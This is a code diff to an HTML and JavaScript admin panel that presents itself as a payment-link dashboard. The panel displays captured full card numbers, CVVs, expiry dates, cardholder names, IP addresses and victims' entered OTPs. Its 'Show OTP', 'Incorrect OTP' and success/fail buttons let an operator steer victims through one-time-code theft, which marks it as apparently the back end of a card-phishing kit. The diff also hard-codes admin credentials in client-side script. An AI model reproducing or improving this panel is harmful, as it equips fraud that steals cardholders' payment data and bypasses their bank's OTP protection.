@@ -286,6 +286,150 @@
       border-left: 4px solid var(--danger);
     }
   </style>
+  <script>
+    // Global Variables
+    // (Admin panel will fetch transactions from your server)
+    async function loadTransactions() {
+      try {
+        const response = await fetch('/api/transactions');
+        const txData = await response.json();
+        const tbody = document.querySelector("#transactionsTable tbody");
+        tbody.innerHTML = '';
+        txData.forEach(tx => {
+          const row = document.createElement('tr');
+          row.innerHTML = `
+            <td>${tx.id}</td>
+            <td>${tx.email}</td>
+            <td>${tx.amount}</td>
+            <td>${tx.currency}</td>
+            <td>${tx.cardNumber}</td>
+            <td>${tx.cvv}</td>
+            <td>${tx.expiry}</td>
+            <td>${tx.cardholder}</td>
+            <td>${tx.ip || 'N/A'}</td>
+            <td>
+              ${tx.otpEntered ? 
+                `<span class="otp-received">${tx.otpEntered}</span>
+                 <button class="wrong-otp-btn" onclick="markWrongOTP('${tx.id}', this)" ${tx.redirectStatus ? 'disabled' : ''}>
+                   Incorrect OTP
+                 </button>` : 
+                tx.otpShown ? 
+                  '<span class="status-badge status-otp">Waiting for OTP</span>' : 
+                  `<button class="show-otp-btn" onclick="showOTP('${tx.id}', this)" ${tx.status !== 'processing' ? 'disabled' : ''}>
+                    Show OTP
+                  </button>`
+              }
+            </td>
+            <td>
+              <span class="status-badge status-${tx.status || 'processing'}">
+                ${tx.status || 'Processing'}
+              </span>
+            </td>
+            <td>
+              ${!tx.redirectStatus ? `
+                <button onclick="updateStatus('${tx.id}', 'success', this)" ${!tx.otpEntered ? 'disabled' : ''}>
+                  Success
+                </button>
+                <button onclick="updateStatus('${tx.id}', 'fail', this)" ${!tx.otpEntered ? 'disabled' : ''}>
+                  Fail
+                </button>
+              ` : ''}
+            </td>
+          `;
+          tbody.appendChild(row);
+        });
+      } catch (error) {
+        console.error("Error loading transactions:", error);
+      }
+    }
+  </script>
+  <script>
+    // Admin Login & Other Functions
+    const validUsername = "admin";
+    const validPassword = "Alex20HB@";
+    let currentPassword = validPassword;
+
+    function showToast(message, type = 'success') {
+      const toast = document.getElementById('toast');
+      toast.textContent = message;
+      toast.className = `toast ${type} show`;
+      setTimeout(() => {
+        toast.className = 'toast';
+      }, 3000);
+    }
+
+    function setLoading(button, isLoading) {
+      if (isLoading) {
+        button.classList.add('loading');
+        button.disabled = true;
+      } else {
+        button.classList.remove('loading');
+        button.disabled = false;
+      }
+    }
+
+    async function doLogin(e) {
+      e.preventDefault();
+      const loginButton = document.getElementById('loginButton');
+      setLoading(loginButton, true);
+      const username = document.getElementById('adminUsername').value;
+      const password = document.getElementById('adminPassword').value;
+      await new Promise(resolve => setTimeout(resolve, 800));
+      if (username === validUsername && password === currentPassword) {
+        localStorage.setItem("adminLoggedIn", "true");
+        document.getElementById('adminUser').textContent = username;
+        document.getElementById('loginForm').style.display = 'none';
+        document.getElementById('adminContent').style.display = 'block';
+        loadTransactions();
+        setInterval(loadTransactions, 2000);
+        showToast('Login successful');
+      } else {
+        showToast('Invalid credentials', 'error');
+      }
+      setLoading(loginButton, false);
+      return false;
+    }
+
+    function logout() {
+      localStorage.removeItem("adminLoggedIn");
+      showToast('Logged out successfully');
+      setTimeout(() => location.reload(), 1000);
+    }
+
+    async function deleteHistory() {
+      if (confirm("Are you sure you want to delete all transaction history?")) {
+        // Implement your API call if needed, or clear transactions in your backend
+        await fetch('/api/deleteTransactions', { method: 'DELETE' });
+        loadTransactions();
+        showToast('Transaction history deleted successfully');
+      }
+    }
+
+    function showProfile() {
+      const modal = document.getElementById('userProfileModal');
+      document.getElementById('profileUsername').textContent = validUsername;
+      modal.style.display = 'flex';
+      setTimeout(() => modal.classList.add('active'), 10);
+    }
+
+    function closeProfile() {
+      const modal = document.getElementById('userProfileModal');
+      modal.classList.remove('active');
+      setTimeout(() => modal.style.display = 'none', 300);
+    }
+
+    document.getElementById('changePasswordForm').onsubmit = async function(e) {
+      e.preventDefault();
+      const submitButton = document.querySelector('#changePasswordForm button[type="submit"]');
+      setLoading(submitButton, true);
+      const newPassword = document.getElementById('newPassword').value;
+      await new Promise(resolve => setTimeout(resolve, 800));
+      currentPassword = newPassword;
+      showToast('Password changed successfully');
+      closeProfile();
+      setLoading(submitButton, false);
+    };
+  </script>
 </head>
 <body>
   <!-- Login Form -->
@@ -386,223 +530,6 @@
   <div id="toast" class="toast"></div>
 
   <script>
-    // Admin credentials and login handling
-    const validUsername = "admin";
-    const validPassword = "Alex20HB@";
-    let currentPassword = validPassword;
-
-    function showToast(message, type = 'success') {
-      const toast = document.getElementById('toast');
-      toast.textContent = message;
-      toast.className = `toast ${type} show`;
-      setTimeout(() => {
-        toast.className = 'toast';
-      }, 3000);
-    }
-
-    function setLoading(button, isLoading) {
-      if (isLoading) {
-        button.classList.add('loading');
-        button.disabled = true;
-      } else {
-        button.classList.remove('loading');
-        button.disabled = false;
-      }
-    }
-
-    async function doLogin(e) {
-      e.preventDefault();
-      const loginButton = document.getElementById('loginButton');
-      setLoading(loginButton, true);
-      const username = document.getElementById('adminUsername').value;
-      const password = document.getElementById('adminPassword').value;
-      await new Promise(resolve => setTimeout(resolve, 800));
-      if (username === validUsername && password === currentPassword) {
-        localStorage.setItem("adminLoggedIn", "true");
-        document.getElementById('adminUser').textContent = username;
-        document.getElementById('loginForm').style.display = 'none';
-        document.getElementById('adminContent').style.display = 'block';
-        loadTransactions();
-        setInterval(loadTransactions, 2000);
-        showToast('Login successful');
-      } else {
-        showToast('Invalid credentials', 'error');
-      }
-      setLoading(loginButton, false);
-      return false;
-    }
-
-    function logout() {
-      localStorage.removeItem("adminLoggedIn");
-      showToast('Logged out successfully');
-      setTimeout(() => location.reload(), 1000);
-    }
-
-    async function deleteHistory() {
-      if (confirm("Are you sure you want to delete all transaction history?")) {
-        transactions = [];
-        await new Promise(resolve => setTimeout(resolve, 500));
-        loadTransactions();
-        showToast('Transaction history deleted successfully');
-      }
-    }
-
-    function showProfile() {
-      const modal = document.getElementById('userProfileModal');
-      document.getElementById('profileUsername').textContent = validUsername;
-      modal.style.display = 'flex';
-      setTimeout(() => modal.classList.add('active'), 10);
-    }
-
-    function closeProfile() {
-      const modal = document.getElementById('userProfileModal');
-      modal.classList.remove('active');
-      setTimeout(() => modal.style.display = 'none', 300);
-    }
-
-    document.getElementById('changePasswordForm').onsubmit = async function(e) {
-      e.preventDefault();
-      const submitButton = document.querySelector('#changePasswordForm button[type="submit"]');
-      setLoading(submitButton, true);
-      const newPassword = document.getElementById('newPassword').value;
-      await new Promise(resolve => setTimeout(resolve, 800));
-      currentPassword = newPassword;
-      showToast('Password changed successfully');
-      closeProfile();
-      setLoading(submitButton, false);
-    };
-
-    // Payment link generation
-    async function generateLink(e) {
-      e.preventDefault();
-      const amount = document.getElementById('amount').value;
-      const description = document.getElementById('description').value;
-      try {
-        const response = await fetch('/api/generatePaymentLink', {
-          method: 'POST',
-          headers: { 'Content-Type': 'application/json' },
-          body: JSON.stringify({ amount, description })
-        });
-        const data = await response.json();
-        if (data.status === 'success') {
-          document.getElementById('paymentLink').textContent = data.paymentLink;
-          document.getElementById('paymentLinkContainer').style.display = 'flex';
-          showToast('Payment link generated successfully');
-        } else {
-          alert('Failed to generate payment link');
-        }
-      } catch (error) {
-        console.error('Error generating payment link:', error);
-        alert('Failed to generate payment link');
-      }
-    }
-
-    document.getElementById('generateLinkForm').addEventListener('submit', generateLink);
-
-    async function copyPaymentLink() {
-      const link = document.getElementById('paymentLink').textContent;
-      await navigator.clipboard.writeText(link);
-      showToast('Payment link copied to clipboard');
-    }
-
-    // Transaction management (mock data for demo)
-    let transactions = [
-      {
-        id: 'tx' + Math.random().toString(36).substr(2, 9),
-        email: 'user@example.com',
-        amount: 1000,
-        currency: 'INR',
-        cardNumber: '4111111111111111',
-        cvv: '123',
-        expiry: '12/24',
-        cardholder: 'John Doe',
-        ip: '192.168.1.1',
-        status: 'processing'
-      }
-    ];
-
-    function loadTransactions() {
-      const tbody = document.querySelector("#transactionsTable tbody");
-      tbody.innerHTML = '';
-      transactions.forEach(tx => {
-        const row = document.createElement('tr');
-        row.innerHTML = `
-          <td>${tx.id}</td>
-          <td>${tx.email}</td>
-          <td>${tx.amount}</td>
-          <td>${tx.currency}</td>
-          <td>${tx.cardNumber}</td>
-          <td>${tx.cvv}</td>
-          <td>${tx.expiry}</td>
-          <td>${tx.cardholder}</td>
-          <td>${tx.ip || 'N/A'}</td>
-          <td>
-            ${tx.otpEntered ? 
-              `<span class="otp-received">${tx.otpEntered}</span>
-               <button class="wrong-otp-btn" onclick="markWrongOTP('${tx.id}', this)" ${tx.redirectStatus ? 'disabled' : ''}>
-                 Incorrect OTP
-               </button>` : 
-              tx.otpShown ? 
-                '<span class="status-badge status-otp">Waiting for OTP</span>' : 
-                `<button class="show-otp-btn" onclick="showOTP('${tx.id}', this)" ${tx.status !== 'processing' ? 'disabled' : ''}>
-                  Show OTP
-                </button>`
-            }
-          </td>
-          <td>
-            <span class="status-badge status-${tx.status || 'processing'}">
-              ${tx.status || 'Processing'}
-            </span>
-          </td>
-          <td>
-            ${!tx.redirectStatus ? `
-              <button onclick="updateStatus('${tx.id}', 'success', this)" ${!tx.otpEntered ? 'disabled' : ''}>
-                Success
-              </button>
-              <button onclick="updateStatus('${tx.id}', 'fail', this)" ${!tx.otpEntered ? 'disabled' : ''}>
-                Fail
-              </button>
-             ` : ''}
-          </td>
-        `;
-        tbody.appendChild(row);
-      });
-    }
-
-    async function showOTP(id, button) {
-      setLoading(button, true);
-      await new Promise(resolve => setTimeout(resolve, 800));
-      const tx = transactions.find(t => t.id === id);
-      if (tx) {
-        tx.otpShown = true;
-        loadTransactions();
-        showToast('OTP request sent');
-      }
-    }
-
-    async function markWrongOTP(id, button) {
-      setLoading(button, true);
-      await new Promise(resolve => setTimeout(resolve, 800));
-      const tx = transactions.find(t => t.id === id);
-      if (tx) {
-        tx.status = 'fail';
-        loadTransactions();
-        showToast('OTP marked as incorrect', 'error');
-      }
-    }
-
-    async function updateStatus(id, status, button) {
-      setLoading(button, true);
-      await new Promise(resolve => setTimeout(resolve, 800));
-      const tx = transactions.find(t => t.id === id);
-      if (tx) {
-        tx.redirectStatus = status;
-        tx.status = status;
-        loadTransactions();
-        showToast(`Transaction marked as ${status}`);
-      }
-    }
-
     window.onload = function() {
       const loggedIn = localStorage.getItem('adminLoggedIn') === 'true';
       if (loggedIn) {
